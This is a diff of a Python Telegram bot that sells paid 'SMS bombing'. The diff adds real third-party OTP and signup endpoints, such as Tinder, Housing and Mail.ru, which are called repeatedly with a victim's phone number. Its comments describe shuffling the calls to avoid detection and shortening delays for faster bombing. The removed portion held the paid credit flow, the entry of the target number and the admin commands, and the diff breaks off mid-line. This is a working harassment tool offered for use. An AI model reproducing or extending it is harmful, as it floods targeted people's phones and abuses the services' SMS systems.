@@ -8,8 +8,7 @@ import random
 from telegram import (
     Update, 
     InlineKeyboardButton, 
-    InlineKeyboardMarkup,
-    InputMediaPhoto
+    InlineKeyboardMarkup
 )
 from telegram.ext import (
     Application, 
@@ -193,7 +192,7 @@ def is_verified(user_id):
     user = get_user(user_id)
     return user and user[9] == 1
 
-# Enhanced SMS Bomber Class
+# Your SMS Bomber Class (Integrated)
 class UltimateSMSBomber:
     def __init__(self, phone_number, country_code="91", message_count=10):
         self.phone = phone_number
@@ -209,7 +208,11 @@ class UltimateSMSBomber:
         self.apis = self._load_all_apis()
     
     def _load_all_apis(self):
-        apis = [
+        """Load all APIs from your provided code"""
+        apis = []
+        
+        # Indian APIs (country code 91)
+        indian_apis = [
             {
                 "name": "ConfirmTKT",
                 "method": "GET",
@@ -230,30 +233,120 @@ class UltimateSMSBomber:
                 "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
                 "data": {"mobileoremail": self.phone, "name": "markluther"},
                 "identifier": "true"
+            },
+            {
+                "name": "Frotels",
+                "method": "POST",
+                "url": "https://www.frotels.com/appsendsms.php",
+                "data": {"mobno": self.phone},
+                "identifier": "sent"
+            },
+            {
+                "name": "GAPOON",
+                "method": "POST",
+                "url": "https://www.gapoon.com/userSignup",
+                "data": {
+                    "mobile": self.phone,
+                    "email": "noreply@gmail.com",
+                    "name": "LexLuthor"
+                },
+                "identifier": "1"
+            },
+            {
+                "name": "Housing",
+                "method": "POST",
+                "url": "https://login.housing.com/api/v2/send-otp",
+                "data": {"phone": self.phone},
+                "identifier": "Sent"
+            },
+            {
+                "name": "Porter",
+                "method": "POST",
+                "url": "https://porter.in/restservice/send_app_link_sms",
+                "data": {"phone": self.phone, "referrer_string": "", "brand": "porter"},
+                "identifier": "true"
+            },
+            {
+                "name": "Cityflo",
+                "method": "POST",
+                "url": "https://cityflo.com/website-app-download-link-sms/",
+                "data": {"mobile_number": self.phone},
+                "identifier": "sent"
             }
         ]
-        return apis
+        
+        # Multi-country APIs
+        multi_country_apis = [
+            {
+                "name": "Qlean",
+                "method": "POST",
+                "url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
+                "data": {"phone": f"{self.country_code}{self.phone}"},
+                "identifier": "request_id"
+            },
+            {
+                "name": "Mail.ru",
+                "method": "POST",
+                "url": "https://cloud.mail.ru/api/v2/notify/applink",
+                "data": {
+                    "phone": f"+{self.country_code}{self.phone}",
+                    "api": "2",
+                    "email": "email",
+                    "x-email": "x-email"
+                },
+                "identifier": "200"
+            },
+            {
+                "name": "Tinder",
+                "method": "POST",
+                "url": "https://api.gotinder.com/v2/auth/sms/send",
+                "data": {"phone_number": f"{self.country_code}{self.phone}"},
+                "params": {"auth_type": "sms", "locale": "ru"},
+                "identifier": "200"
+            }
+        ]
+        
+        # Combine all APIs
+        all_apis = indian_apis + multi_country_apis
+        
+        # Add country code to each API
+        for api in all_apis:
+            api["cc"] = self.country_code
+            
+        return all_apis
     
     def _send_request(self, api):
         try:
-            url = api["url"]
+            # Replace placeholders
+            url = api["url"].replace("{target}", self.phone).replace("{cc}", self.country_code)
+            
+            # Prepare request data
+            request_data = {}
+            if "data" in api:
+                request_data = {k: v.replace("{target}", self.phone).replace("{cc}", self.country_code) 
+                              if isinstance(v, str) else v 
+                              for k, v in api["data"].items()}
             
             headers = {
                 "User-Agent": self.user_agent,
                 **api.get("headers", {})
             }
             
+            cookies = api.get("cookies", {})
+            
+            # Send request
             if api["method"] == "POST":
                 if "json" in api:
-                    response = requests.post(url, json=api["json"], headers=headers, timeout=10)
+                    response = requests.post(url, json=api["json"], headers=headers, cookies=cookies, timeout=10)
                 else:
-                    response = requests.post(url, data=api.get("data", {}), headers=headers, timeout=10)
+                    response = requests.post(url, data=request_data, headers=headers, cookies=cookies, timeout=10)
             else:
-                response = requests.get(url, params=api.get("params", {}), headers=headers, timeout=10)
+                params = request_data if "data" in api else api.get("params", {})
+                response = requests.get(url, params=params, headers=headers, cookies=cookies, timeout=10)
             
+            # Check success
             identifier = api.get("identifier", "")
             success = False
-            
             if identifier:
                 if identifier.isdigit():
                     success = str(response.status_code) == identifier
@@ -262,6 +355,7 @@ class UltimateSMSBomber:
             else:
                 success = response.status_code == 200
             
+            # Update stats
             with self.lock:
                 if success:
                     self.success_count += 1
@@ -279,17 +373,21 @@ class UltimateSMSBomber:
             return False
     
     def start_bombing(self):
+        """Start multi-threaded bombing with limited messages"""
         self.active = True
         self.sent_count = 0
         
         def bomb_worker():
             while self.active and self.sent_count < self.message_count:
+                # Shuffle APIs to avoid pattern detection
                 random.shuffle(self.apis)
+                
                 for api in self.apis:
                     if not self.active or self.sent_count >= self.message_count:
                         break
+                    
                     self._send_request(api)
-                    time.sleep(0.5)
+                    time.sleep(0.5)  # Reduced delay for faster bombing
         
         thread = threading.Thread(target=bomb_worker)
         thread.daemon = True
@@ -510,650 +608,4 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     elif query.data == "bomb_menu":
         user = get_user(user_id)
-        if user[3] <= 0:
-            await query.answer("❌ Insufficient credits! Please buy more credits.", show_alert=True)
-            return
-        
-        bomb_text = f"""
-🚀 **SMS Bombing Menu**
-
-💳 **Your Credits:** {user[3]}
-📨 **1 Credit = 1 SMS**
-
-**Select number of messages to send:**
-"""
-        keyboard = []
-        row = []
-        for count, value in BOMB_OPTIONS.items():
-            if value <= user[3]:
-                row.append(InlineKeyboardButton(f"📨 {count}", callback_data=f"bomb_{count}"))
-                if len(row) == 2:
-                    keyboard.append(row)
-                    row = []
-        if row:
-            keyboard.append(row)
-        
-        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
-        
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(bomb_text, reply_markup=reply_markup, parse_mode='Markdown')
-    
-    elif query.data.startswith("bomb_"):
-        message_count = query.data.split("_")[1]
-        count_value = BOMB_OPTIONS[message_count]
-        user = get_user(user_id)
-        
-        if user[3] < count_value:
-            await query.answer("❌ Insufficient credits!", show_alert=True)
-            return
-        
-        context.user_data['bomb_count'] = count_value
-        bomb_text = f"""
-🎯 **Bombing Setup**
-
-📨 **Messages to send:** {count_value}
-💳 **Credits required:** {count_value}
-💎 **Your credits:** {user[3]}
-
-📱 **Please send the target number in format:**
-`country_code phone_number`
-
-**Example:**
-`91 9876543210`
-"""
-        await query.edit_message_text(bomb_text, parse_mode='Markdown')
-        return WAITING_PHONE
-    
-    elif query.data.startswith("package_"):
-        package = query.data.split("_")[1]
-        details = CREDIT_PACKAGES[package]
-        
-        # Send QR code as image
-        try:
-            await context.bot.send_photo(
-                chat_id=query.message.chat_id,
-                photo=PAYMENT_QR_URL,
-                caption=f"""
-💳 **Payment Details**
-
-📦 **Package:** {details['credits']} Credits
-💰 **Amount:** ₹{details['price']}
-🎯 **Rate:** 1 Credit = 1 SMS
-
-**Payment Instructions:**
-1. Scan the QR code above
-2. Pay exactly ₹{details['price']}
-3. Click 'Confirm Payment'
-4. Send your UTR Number
-
-💡 **Note:** Payments are verified manually within 1 hour.
-""",
-                parse_mode='Markdown'
-            )
-        except Exception as e:
-            logging.error(f"Error sending QR image: {e}")
-            payment_text = f"""
-💳 **Payment Details**
-
-📦 **Package:** {details['credits']} Credits
-💰 **Amount:** ₹{details['price']}
-🎯 **Rate:** 1 Credit = 1 SMS
-
-📸 **Payment QR Code:**
-{PAYMENT_QR_URL}
-
-**Payment Instructions:**
-1. Scan the QR code above
-2. Pay exactly ₹{details['price']}
-3. Click 'Confirm Payment'
-4. Send your UTR Number
-"""
-            await query.edit_message_text(payment_text, parse_mode='Markdown')
-        
-        keyboard = [
-            [InlineKeyboardButton("✅ Confirm Payment", callback_data=f"confirm_{package}")],
-            [InlineKeyboardButton("❌ Cancel", callback_data="buy_credit")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text("Click the button below after scanning QR:", reply_markup=reply_markup)
-    
-    elif query.data.startswith("confirm_"):
-        package = query.data.split("_")[1]
-        details = CREDIT_PACKAGES[package]
-        context.user_data['pending_payment'] = package
-        
-        confirm_text = f"""
-✅ **Payment Confirmation**
-
-📦 **Package:** {details['credits']} Credits
-💰 **Amount:** ₹{details['price']}
-
-📝 **Please send your UTR Number:**
-(Transaction Reference Number)
-
-💡 **You can find UTR in your bank statement or payment app.**
-"""
-        
-        await query.edit_message_text(confirm_text, parse_mode='Markdown')
-        return WAITING_UTR
-    
-    elif query.data == "main_menu":
-        await show_main_menu(update, context)
-    
-    elif query.data == "stop_bombing":
-        if 'bomber' in context.user_data:
-            bomber = context.user_data['bomber']
-            result = bomber.stop_bombing()
-            await query.edit_message_text(result, parse_mode='Markdown')
-        else:
-            await query.answer("❌ No active bombing session!", show_alert=True)
-
-async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    text = update.message.text.strip()
-    
-    if not is_verified(user_id):
-        await start(update, context)
-        return ConversationHandler.END
-    
-    bomb_count = context.user_data.get('bomb_count', 10)
-    user = get_user(user_id)
-    
-    if user[3] < bomb_count:
-        await update.message.reply_text("❌ Insufficient credits! Please buy more credits.")
-        return ConversationHandler.END
-    
-    try:
-        if ' ' in text:
-            country_code, phone = text.split(' ', 1)
-            country_code = country_code.strip()
-            phone = phone.strip()
-            
-            if not (country_code.isdigit() and phone.isdigit()):
-                await update.message.reply_text("❌ Invalid phone number format. Use numbers only.")
-                return WAITING_PHONE
-                
-        else:
-            await update.message.reply_text("❌ Invalid format. Use: `91 9876543210`", parse_mode='Markdown')
-            return WAITING_PHONE
-        
-        # Deduct credits
-        update_credits(user_id, -bomb_count)
-        
-        # Start bombing
-        bomber = UltimateSMSBomber(phone, country_code, bomb_count)
-        context.user_data['bomber'] = bomber
-        start_result = bomber.start_bombing()
-        
-        bombing_text = f"""
-{start_result}
-
-⏳ **Status:** Running...
-🛑 **Stop:** Click button below to stop
-
-📊 **Progress:**
-✅ Success: 0
-❌ Failed: 0  
-📨 Sent: 0/{bomb_count}
-"""
-        keyboard = [[InlineKeyboardButton("🛑 Stop Bombing", callback_data="stop_bombing")]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        progress_msg = await update.message.reply_text(bombing_text, reply_markup=reply_markup, parse_mode='Markdown')
-        
-        # Start progress monitoring
-        asyncio.create_task(monitor_bombing_progress(update, context, bomber, progress_msg.message_id))
-        
-        return ConversationHandler.END
-        
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error: {str(e)}")
-        return ConversationHandler.END
-
-async def monitor_bombing_progress(update: Update, context: ContextTypes.DEFAULT_TYPE, bomber, message_id):
-    user_id = update.effective_user.id
-    chat_id = update.effective_chat.id
-    
-    max_attempts = 50
-    attempts = 0
-    
-    while bomber.active and bomber.sent_count < bomber.message_count and attempts < max_attempts:
-        try:
-            progress = bomber.get_progress()
-            progress_text = f"""
-🚀 **Bombing in Progress...**
-
-📱 **Target:** +{bomber.country_code}{bomber.phone}
-📨 **Messages:** {progress['sent']}/{bomber.message_count}
-
-📊 **Progress:**
-✅ Success: {progress['success']}
-❌ Failed: {progress['failed']}
-⚡ Success Rate: {(progress['success']/max(progress['sent'],1))*100:.1f}%
-
-🛑 Click below to stop bombing
-"""
-            keyboard = [[InlineKeyboardButton("🛑 Stop Bombing", callback_data="stop_bombing")]]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            
-            await context.bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=progress_text,
-                reply_markup=reply_markup,
-                parse_mode='Markdown'
-            )
-            
-            await asyncio.sleep(3)
-            attempts += 1
-            
-        except Exception as e:
-            break
-    
-    # Final update
-    if bomber.sent_count >= bomber.message_count:
-        final_text = f"""
-🎉 **Bombing Completed!**
-
-📱 **Target:** +{bomber.country_code}{bomber.phone}
-📨 **Messages Sent:** {bomber.message_count}
-
-📊 **Final Results:**
-✅ Success: {bomber.success_count}
-❌ Failed: {bomber.fail_count}
-⚡ Success Rate: {(bomber.success_count/max(bomber.message_count,1))*100:.1f}%
-
-💎 **Credits used:** {bomber.message_count}
-"""
-        try:
-            await context.bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=final_text,
-                parse_mode='Markdown'
-            )
-        except:
-            pass
-
-async def handle_utr(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    utr = update.message.text.strip()
-    package = context.user_data.get('pending_payment')
-    
-    if not package:
-        await update.message.reply_text("❌ No pending payment found. Please start over.")
-        return ConversationHandler.END
-    
-    details = CREDIT_PACKAGES[package]
-    
-    add_payment(user_id, package, details['price'], details['credits'], utr)
-    
-    user = get_user(user_id)
-    
-    # Notify admin
-    admin_text = f"""
-💰 **New Payment Request**
-
-👤 **User:** {user[2]} (@{user[1]})
-🆔 **User ID:** `{user_id}`
-📦 **Package:** {details['credits']} credits
-💰 **Amount:** ₹{details['price']}
-🔢 **UTR:** `{utr}`
-
-⚠️ **Please verify payment manually**
-"""
-    
-    try:
-        await context.bot.send_message(ADMIN_ID, admin_text, parse_mode='Markdown')
-    except Exception as e:
-        logging.error(f"Failed to notify admin: {e}")
-    
-    # Notify user
-    user_text = f"""
-✅ **Payment Received**
-
-📦 **Package:** {details['credits']} Credits
-💰 **Amount:** ₹{details['price']}
-🔢 **UTR:** `{utr}`
-
-⏳ **Status:** Under Verification
-🕐 **Time:** Usually within 1 hour
-
-📞 **For Help:** @HelpLuffyBot
-
-Thank you for your payment! Your credits will be added soon.
-"""
-    
-    await update.message.reply_text(user_text, parse_mode='Markdown')
-    return ConversationHandler.END
-
-# Admin Commands
-async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text("❌ Admin access required.")
-        return
-    
-    if len(context.args) != 2:
-        await update.message.reply_text("Usage: /addcredit <user_id> <amount>")
-        return
-    
-    try:
-        target_user = int(context.args[0])
-        amount = int(context.args[1])
-        
-        update_credits(target_user, amount)
-        target = get_user(target_user)
-        
-        await update.message.reply_text(f"✅ Added {amount} credits to user {target[2]} (@{target[1]})")
-        
-        try:
-            await context.bot.send_message(target_user, f"🎉 You received {amount} credits from admin!")
-        except:
-            pass
-            
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID or amount.")
-
-async def minus_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text("❌ Admin access required.")
-        return
-    
-    if len(context.args) != 2:
-        await update.message.reply_text("Usage: /minuscredit <user_id> <amount>")
-        return
-    
-    try:
-        target_user = int(context.args[0])
-        amount = int(context.args[1])
-        
-        update_credits(target_user, -amount)
-        target = get_user(target_user)
-        
-        await update.message.reply_text(f"✅ Deducted {amount} credits from user {target[2]} (@{target[1]})")
-            
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID or amount.")
-
-async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text("❌ Admin access required.")
-        return
-    
-    if not context.args:
-        await update.message.reply_text("Usage: /info <user_id or username>")
-        return
-    
-    search_term = context.args[0]
-    
-    try:
-        if search_term.startswith('@'):
-            conn = sqlite3.connect('users.db')
-            cursor = conn.cursor()
-            cursor.execute('SELECT * FROM users WHERE username = ?', (search_term[1:],))
-            target = cursor.fetchone()
-            conn.close()
-        else:
-            target = get_user(int(search_term))
-        
-        if not target:
-            await update.message.reply_text("❌ User not found.")
-            return
-        
-        premium_status = "Premium" if target[6] else "Regular"
-        admin_status = "Yes" if target[7] else "No"
-        verified_status = "Yes" if target[9] else "No"
-        
-        info_text = f"""
-👤 **User Information**
-
-🆔 **User ID:** `{target[0]}`
-📛 **Username:** @{target[1]}
-👤 **Name:** {target[2]}
-💳 **Credits:** {target[3]}
-👥 **Referrals:** {target[4]}
-👑 **Admin:** {admin_status}
-🎯 **Premium:** {premium_status}
-✅ **Verified:** {verified_status}
-📅 **Joined:** {target[8][:10]}
-"""
-        await update.message.reply_text(info_text, parse_mode='Markdown')
-        
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error: {str(e)}")
-
-async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text("❌ Admin access required.")
-        return
-    
-    if len(context.args) != 1:
-        await update.message.reply_text("Usage: /addadmin <user_id>")
-        return
-    
-    try:
-        new_admin = int(context.args[0])
-        conn = sqlite3.connect('users.db')
-        cursor = conn.cursor()
-        cursor.execute('UPDATE users SET is_admin = 1 WHERE user_id = ?', (new_admin,))
-        conn.commit()
-        conn.close()
-        
-        await update.message.reply_text(f"✅ User {new_admin} added as admin.")
-        
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID.")
-
-async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text("❌ Admin access required.")
-        return
-    
-    if len(context.args) != 1:
-        await update.message.reply_text("Usage: /removeadmin <user_id>")
-        return
-    
-    try:
-        target_admin = int(context.args[0])
-        if target_admin == ADMIN_ID:
-            await update.message.reply_text("❌ Cannot remove main admin.")
-            return
-            
-        conn = sqlite3.connect('users.db')
-        cursor = conn.cursor()
-        cursor.execute('UPDATE users SET is_admin = 0 WHERE user_id = ?', (target_admin,))
-        conn.commit()
-        conn.close()
-        
-        await update.message.reply_text(f"✅ User {target_admin} removed from admin.")
-        
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID.")
-
-async def statics(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text("❌ Admin access required.")
-        return
-    
-    total_users = get_total_users()
-    total_credits = get_total_credits()
-    total_referrals = get_total_referrals()
-    
-    conn = sqlite3.connect('users.db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT COUNT(*) FROM users WHERE is_admin = 1')
-    admin_count = cursor.fetchone()[0]
-    conn.close()
-    
-    stats_text = f"""
-📊 **Bot Statistics**
-
-👥 **Total Users:** {total_users}
-💳 **Total Credits:** {total_credits}
-👥 **Total Referrals:** {total_referrals}
-👑 **Total Admins:** {admin_count}
-"""
-    await update.message.reply_text(stats_text, parse_mode='Markdown')
-
-async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text("❌ Admin access required.")
-        return
-    
-    if not context.args:
-        await update.message.reply_text("Usage: /broadcast <message>")
-        return
-    
-    message = ' '.join(context.args)
-    all_users = get_all_users()
-    
-    success_count = 0
-    fail_count = 0
-    
-    for user in all_users:
-        try:
-            await context.bot.send_message(
-                user[0],
-                f"📢 **Broadcast Message**\n\n{message}\n\n_From Admin_",
-                parse_mode='Markdown'
-            )
-            success_count += 1
-        except Exception:
-            fail_count += 1
-    
-    await update.message.reply_text(
-        f"📊 **Broadcast Results**\n\n"
-        f"✅ Success: {success_count}\n"
-        f"❌ Failed: {fail_count}"
-    )
-
-async def getalluser(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text("❌ Admin access required.")
-        return
-    
-    all_users = get_all_users()
-    
-    if not all_users:
-        await update.message.reply_text("❌ No users found.")
-        return
-    
-    user_list = "👥 **All Users List**\n\n"
-    
-    for user in all_users[:20]:
-        user_list += f"🆔 {user[0]} | 👤 {user[2]} | 💳 {user[3]} credits\n"
-    
-    if len(all_users) > 20:
-        user_list += f"\n... and {len(all_users) - 20} more users"
-    
-    await update.message.reply_text(user_list, parse_mode='Markdown')
-
-async def lostalluser(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text("❌ Admin access required.")
-        return
-    
-    conn = sqlite3.connect('users.db')
-    cursor = conn.cursor()
-    cursor.execute('DELETE FROM users WHERE user_id != ?', (ADMIN_ID,))
-    cursor.execute('DELETE FROM payments')
-    conn.commit()
-    conn.close()
-    
-    await update.message.reply_text("✅ All users data cleared (except admin).")
-
-async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text("❌ Admin access required.")
-        return
-    
-    if len(context.args) != 1:
-        await update.message.reply_text("Usage: /ban <user_id>")
-        return
-    
-    try:
-        target_user = int(context.args[0])
-        update_credits(target_user, -get_user(target_user)[3])
-        await update.message.reply_text(f"✅ User {target_user} banned (credits set to 0).")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID.")
-
-async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text("❌ Admin access required.")
-        return
-    
-    if len(context.args) != 1:
-        await update.message.reply_text("Usage: /unban <user_id>")
-        return
-    
-    try:
-        target_user = int(context.args[0])
-        update_credits(target_user, 30)
-        await update.message.reply_text(f"✅ User {target_user} unbanned (30 credits restored).")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID.")
-
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("❌ Operation cancelled.")
-    return ConversationHandler.END
-
-def main():
-    # Initialize database
-    init_db()
-    
-    # Create application
-    application = Application.builder().token(BOT_TOKEN).build()
-    
-    # Add conversation handlers
-    payment_conv = ConversationHandler(
-        entry_points=[CallbackQueryHandler(button_handler, pattern='^confirm_')],
-        states={WAITING_UTR: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_utr)]},
-        fallbacks=[CommandHandler('cancel', cancel)],
-        per_message=False
-    )
-    
-    bomb_conv = ConversationHandler(
-        entry_points=[CallbackQueryHandler(button_handler, pattern='^bomb_')],
-        states={WAITING_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_number)]},
-        fallbacks=[CommandHandler('cancel', cancel)],
-        per_message=False
-    )
-    
-    # Add handlers
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("addcredit", add_credit))
-    application.add_handler(CommandHandler("minuscredit", minus_credit))
-    application.add_handler(CommandHandler("info", user_info))
-    application.add_handler(CommandHandler("addadmin", add_admin))
-    application.add_handler(CommandHandler("removeadmin", remove_admin))
-    application.add_handler(CommandHandler("statics", statics))
-    application.add_handler(CommandHandler("broadcast", broadcast))
-    application.add_handler(CommandHandler("getalluser", getalluser))
-    application.add_handler(CommandHandler("lostalluser", lostalluser))
-    application.add_handler(CommandHandler("ban", ban_user))
-    application.add_handler(CommandHandler("unban", unban_user))
-    
-    application.add_handler(CallbackQueryHandler(verify_subscription, pattern='^verify_subscription$'))
-    application.add_handler(CallbackQueryHandler(button_handler))
-    
-    application.add_handler(payment_conv)
-    application.add_handler(bomb_conv)
-    
-    # Start bot
-    print("🤖 Bot is running...")
-    application.run_polling()
-
-if __name__ == '__main__':
-    main()
+        if user
